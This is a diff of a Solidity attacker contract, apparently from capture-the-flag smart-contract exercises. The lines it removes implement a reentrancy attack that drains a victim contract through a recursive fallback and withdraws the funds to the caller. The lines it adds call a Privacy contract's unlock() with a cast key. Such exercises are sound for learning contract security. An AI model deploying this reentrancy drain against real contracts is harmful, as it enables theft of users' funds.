@@ -1,38 +1,23 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "./reentrency.sol";
+import "./privacy.sol";
 import "hardhat/console.sol";
 
 contract Attacker{
-    Reentrance victimContract; //Contractname contractvariable
+    Privacy victimContract; //Contractname contractvariable
 
-    address payable victimAddress = 0x903bdD4bCCDC8F2eF30088fc8c7f8a1070063c99; 
+    address victimAddress = 0xbae24653124CA68cEd2A23C395100d9250edA62A; 
 
     // // // import a contract
     constructor() public {
-        victimContract = Reentrance(victimAddress);
+        victimContract = Privacy(victimAddress);
     }
 
-     // Call this function first
-    function donateToVictim() public payable {
-        victimContract.donate{value: msg.value}(address(this));// Send a transaction with .001 eth
-    }
-
-    // call this funciton second
-    function attack() public {
-       if (address(victimContract).balance >= 0 ether){ // when this is called the contract should have .002 eth
-        victimContract.withdraw(.001 ether); 
-        }
+    // Call the privacy function with a casted key
+    function proxyUnlock(bytes32 _key) public{
+        victimContract.unlock(bytes16(_key));
     }
    
-    // call this funciton to claim all the money drained
-    function withdrawToCaller() public {
-        msg.sender.call{value: address(this).balance}("");
-    }
-
-     fallback() external payable {
-       attack();
-    }
 
 }
